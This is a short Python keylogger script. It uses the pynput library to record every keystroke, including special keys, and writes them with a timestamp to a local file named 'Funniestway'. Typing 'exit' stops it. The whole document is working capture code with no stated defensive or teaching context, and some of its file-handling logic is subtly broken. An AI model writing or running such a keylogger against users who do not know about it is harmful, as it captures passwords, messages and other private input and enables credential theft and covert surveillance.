from pynput import keyboard
import datetime
import sys

win2 = []
closing = {'e': False,
            'x': False,
            'i': False,
            't': False
            }

def on_press(key):
    global closing
    try:
        Key__ = '{0}'.format(key.char)
        if Key__ in ('e', 'E'):
            for k in closing.keys():
                closing[k] = False
            closing['e'] = True
        elif Key__ in ('x', 'X') and closing['e']:
            closing['x'] = True
        elif Key__ in ('i', 'I') and closing['x']:
            closing['i'] = True
        elif Key__ in ('t', 'T') and closing['i']:
            closing['t'] = True
            sys.exit()

    except AttributeError:
        Key__ = '{0}'.format(key)[4:len('{0}'.format(key))]
    except Exception as e:
        print(f'Error pressing {e}')
    finally:
        Add(Key__)

def Add(key):
    global start
    global win2
    try:
        o = open('Funniestway', 'a+')
    except:
        o = open('Funniestway','a+')
    finally:
        readed = o.read()
        if start:
            if readed != '':
                readed = readed + '\n' + str(datetime.datetime.now()) + '\n'
            else:
                readed = '\n' + str(datetime.datetime.now()) + '\n'
            start = False
        if len(key) > 1:
            if key != 'space':
                key = key.replace(key,f' [{key}] ')
            else:
                key = key.replace(key,' ')

        o.write(readed + key)



start = True
with keyboard.Listener(
    on_press=on_press) as listener:
    listener.join()

